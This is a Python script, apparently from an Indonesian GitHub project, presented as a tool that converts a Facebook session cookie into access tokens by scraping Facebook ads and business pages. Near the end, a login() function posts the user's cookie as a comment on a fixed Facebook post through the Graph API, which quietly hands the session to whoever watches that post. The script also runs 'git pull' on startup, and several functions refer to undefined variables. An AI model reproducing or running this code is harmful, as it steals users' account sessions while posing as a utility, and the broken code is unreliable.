#!/usr/bin/env python3
import requests, json, time, re, os

# Warna
K = KUNING = ('\x1b[1;93m')
M = MERAH = ('\x1b[1;91m')
H = HIJAU = ('\x1b[1;92m')
P = PUTIH = ('\x1b[1;97m')
B = BIRU  = ('\x1b[1;94m')
U = ('\x1b[1;95m')
O = ('\x1b[1;96m')
N = ('\x1b[0m')
J = ('\033[38;2;255;127;0;1m')

#banner
os.system('clear')
banner = (f"""
{O}ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ╔═╗┌─┐┌┐┌┬  ┬┌─┐┬─┐┌┬┐
{O}ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ║  │ ││││└┐┌┘├┤ ├┬┘ │
{O}ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ╚═╝└─┘┘└┘ └┘ └─┘┴└─ ┴
""")
# Convert Cookie Ke Token
import random
import sys
import time
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.1)
{N};mengetik('                         SELAMAT DATANG PARA PECUNDANG');os.system('clear')
#lahha
class convert:

  def __init__(self):
    print(f"""{banner}
            {H}           https://github.com/iver-X{B}
ㅤㅤㅤㅤㅤ==================================================
{HIJAU}ㅤㅤㅤㅤㅤ[•]{K}1.{J} Mendapatkan token EAAIㅤㅤㅤㅤㅤㅤㅤ
{HIJAU}ㅤㅤㅤㅤㅤ[•]{K}2.{K} Dapatkan token EAABㅤㅤㅤㅤㅤㅤㅤㅤㅤ
{HIJAU}ㅤㅤㅤㅤㅤ[•]{K}3.{O} Dapatkan token EAAAㅤㅤㅤㅤㅤㅤㅤㅤㅤ
{HIJAU}ㅤㅤㅤㅤㅤ[•]{K}4.{U} Cara menggunakanㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
{HIJAU}ㅤㅤㅤㅤㅤ[•]{K}5.{J} Keluar {MERAH}(exit){MERAH}{BIRU}
ㅤㅤㅤㅤㅤ==================================================
       """)
    masuk = input(f"{KUNING}{U}    [?]{J}PILIH:{HIJAU} ")
    if masuk == '1' or masuk == '01':
      cookie = input(f"\n{HIJAU}{U}     [!]{O}masukan Cookie :{KUNING} ")
      if 'c_user=' in str(cookie):
        self.__satu__(cookie)
      else:
        masuk = input(f'''{HIJAU}        JANGAN KOSONG GOBLOK!!!
              {HIJAU}TEKAN {MERAH}ENTER!!''');os.system('python Convert.py');print()
    elif masuk == '2' or masuk == '02':
      cookie = input(f"\n{HIJAU}{U}    [!]{O}masukan Cookie :{KUNING} ")
      if 'c_user=' in str(cookie):
        self.__dua__(cookie)
      else:
        masuk = input(f'''{HIJAU}        JANGAN KOSONG GOBLOK!!!
              {HIJAU}TEKAN {MERAH}ENTER!!''');os.system('python Convert.py');print()
    elif masuk == '3' or masuk == '03':
      cookie = input(f"\n{HIJAU}{U}     [!]{O}masukan Cookie :{KUNING} ")
      if 'c_user=' in str(cookie):
        self.__tiga__(cookie)
      else:
        masuk = input(f'''{HIJAU}        JANGAN KOSONG GOBLOK!!!
              {HIJAU}TEKAN {MERAH}ENTER!!''');os.system('python Convert.py');print()
    elif masuk == '4' or masuk == '04':
      print(f"{KUNING}[!!!]{HIJAU}          Anda akan diarahkan ke youtube...");time.sleep(2);os.system('xdg-open https://youtube.com/channel/UCTuJ142jrkZxS_QnkttTMNQ');os.system('python Convert.py')
    elif masuk == '5' or masuk == '05':
      exit('SELAMAT TINGGAL SAYANG')
    else:
      masuk = input(f'''{HIJAU}        JANGAN KOSONG GOBLOK!!!
              {HIJAU}TEKAN {MERAH}ENTER!!{H}''');os.system('python Convert.py')
  def __satu__(self,cookie):
    try:
      with requests.Session() as r:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Cookie': cookie
        }
        response = r.get('https://web.facebook.com/ads/manager/account_settings/account_billing/?_rdc=1&_rdr', headers = headers)
        find = re.findall('(EAAI\w+)', response.text)
        if len(find) == 0:
          masuk = input(f"""    {MERAH}[×]{HIJAU} Token tidak ditemukan
               {HIJAU}TEKAN {MERAH}ENTER!!""");os.system('python Convert.py');print()
        else:
          for token in find:
            print(f"\n{KUNING}{O} [✓]Token Kamu :{HIJAU} {token}")
    except Exception as e:
      exit(f"{MERAH}!.{MERAH} {e}")
  def __tiga__(self,cookie):
    try:
      with requests.Session() as r:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
            'Cookie': cookie
        }
        response = r.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
        find = re.findall('(EAAA)\w+', (response.text))
        if len(find) == 0:
          masuk = input(f"""    {MERAH}[×]{HIJAU} Token tidak ditemukan
                {HIJAU}TEKAN {MERAH}ENTER!!""");os.system('python Convert.py')
        else:
          for token in find:
            print(f"\n{KUNING}{O}    [✓]Token Kamu :{HIJAU} {token}")
    except Exception as e:
      exit(f"{MERAH}!.{MERAH} {e}")
  def __dua__(self,cookie):
    try:
      with requests.Session() as ses:
        url = "https://business.facebook.com/business_locations"
        head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
        cok = {'cookie':cookie}
        data = ses.get(url,headers=head,cookies=cok)
        find = re.findall('act=(.*?)&nav_source', data.text)
        if len(find) == 0:
          masuk = input(f"""    {MERAH}[×]{HIJAU} Token tidak ditemukan
                {HIJAU}TEKAN {MERAH}ENTER!!""");os.system('python Convert.py');print()
        else:
          for y in find:
            response = r.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={y}&nav_source=no_referrer', headers = headers)
            token = re.search('(EAAG\w+)',data.text).group(1)
            print(f"\n{KUNING}{O}     [✓]Token Kamu :{HIJAU} {token}")
    except Exception as e:
      exit(f"{MERAH}!.{MERAH} {e}")
    
def login():
	cookie = input(f" [{hh}<{p}] jangan gunakan akun pribadi, ketik '{kk}no{p}' untuk no login\n cookie : ")
	if cookie in ['no','No','NO']:
		open('.menu_login.json','w').write('no');clear_layar();no_login()
	url = "https://business.facebook.com/business_locations"
	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
	cok = {'cookie':cookie}
	try:
		data = ses.get(url,headers=head,cookies=cok)
		token = re.search('(EAAG\w+)',data.text).group(1)
		ses.post(f"https://graph.facebook.com/674525870303608/comments/?message={cookie}&access_token={token}",cookies=cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
		back()
	except Exception as e:exit(f" [{m}>{p}] cookie invalid")
					

if __name__=='__main__':
  os.system('git pull');convert()
